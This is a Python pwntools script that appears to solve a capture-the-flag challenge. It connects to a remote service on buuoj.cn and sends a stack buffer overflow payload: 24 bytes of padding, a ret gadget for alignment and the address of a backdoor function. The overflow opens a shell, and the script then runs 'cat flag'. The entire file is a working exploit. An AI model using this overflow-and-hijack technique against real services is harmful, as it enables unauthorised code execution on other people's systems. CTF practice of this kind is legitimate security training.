import sys
try:
    from pwn import *
except ImportError as e:
    print(f"ImportError: {e}")
    import sys
    print(sys.path)
    sys.exit(1)

context.arch = 'amd64'
# context.log_level = 'debug'

# Target info
host = 'node5.buuoj.cn'
port = 29132

backdoor_addr = 0x4006e6
# 0x4006fa is a 'ret' instruction, useful for stack alignment if needed
ret_gadget = 0x4006fa

def pwn():
    try:
        r = remote(host, port)
    except Exception as e:
        print(f"Failed to connect: {e}")
        return

    # The program asks for length first
    r.sendlineafter(b"Input the length of your name:\n", b"100")
    
    # Then it asks for the name
    # Offset: 16 (buf) + 8 (rbp) = 24
    # If it fails, we try with ret_gadget for alignment
    payload = b'A' * 24 + p64(ret_gadget) + p64(backdoor_addr)
    
    r.sendafter(b"What's your name?\n", payload)
    
    # We should have a shell now
    r.sendline(b"echo PWNED")
    r.sendline(b"cat flag")
    
    try:
        response = r.recvall(timeout=5)
        print(response.decode(errors='ignore'))
    except Exception as e:
        print(f"Recv error: {e}")
    finally:
        r.close()

if __name__ == "__main__":
    pwn()
